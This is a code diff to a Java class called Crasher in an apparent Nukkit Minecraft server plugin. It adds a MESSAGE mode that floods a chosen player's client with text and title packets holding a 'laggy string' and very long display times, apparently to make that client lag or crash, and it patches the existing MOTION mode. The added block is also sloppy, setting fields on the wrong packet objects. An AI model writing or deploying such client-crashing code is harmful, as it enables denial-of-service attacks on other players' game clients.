@@ -4,9 +4,7 @@ import cn.nukkit.Player;
 import cn.nukkit.entity.Attribute;
 import cn.nukkit.item.Item;
 import cn.nukkit.level.GlobalBlockPalette;
-import cn.nukkit.network.protocol.AddItemEntityPacket;
-import cn.nukkit.network.protocol.InventoryContentPacket;
-import cn.nukkit.network.protocol.UpdateAttributesPacket;
+import cn.nukkit.network.protocol.*;
 
 import java.util.ArrayList;
 import java.util.Timer;
@@ -79,6 +77,40 @@ public class Crasher {
                     }
                     break;
                 }
+                case MESSAGE:{
+                    for(int i=0;i<(multiplier+1);i++) {
+                        TextPacket textPacket = new TextPacket();
+                        textPacket.type = 0;
+                        textPacket.message = ClientCrasher.getLaggyString();
+                        player.dataPacket(textPacket);
+
+                        SetTitlePacket setTitlePacket = new SetTitlePacket();
+                        setTitlePacket.type = 5;
+                        setTitlePacket.fadeInTime = 0;
+                        setTitlePacket.stayTime = 114514;
+                        setTitlePacket.fadeOutTime = 0;
+                        player.dataPacket(setTitlePacket);
+
+                        SetTitlePacket packet = new SetTitlePacket();
+                        packet.text = ClientCrasher.getLaggyString();
+                        packet.type = 2;
+                        player.dataPacket(packet);
+
+                        SetTitlePacket pk = new SetTitlePacket();
+                        pk.type = 4;
+                        packet.text = ClientCrasher.getLaggyString();
+                        setTitlePacket.fadeInTime = 0;
+                        setTitlePacket.stayTime = 114514;
+                        setTitlePacket.fadeOutTime = 0;
+                        player.dataPacket(packet);
+
+                        TextPacket pk1 = new TextPacket();
+                        pk1.type = 5;
+                        pk1.message = ClientCrasher.getLaggyString();
+                        player.dataPacket(pk);
+                    }
+                    break;
+                }
                 case MOTION:{
                     AddItemEntityPacket addItemEntityPacket=new AddItemEntityPacket();
                     long id=Utils.randInt(10000, 1000000);
@@ -93,6 +125,7 @@ public class Crasher {
                     addItemEntityPacket.speedY=Utils.randInt(30,70)*multiplier;
                     addItemEntityPacket.speedZ=(float) Utils.randDouble(-0.5,0.5);
                     player.dataPacket(addItemEntityPacket);
+                    break;
                 }
             }
 
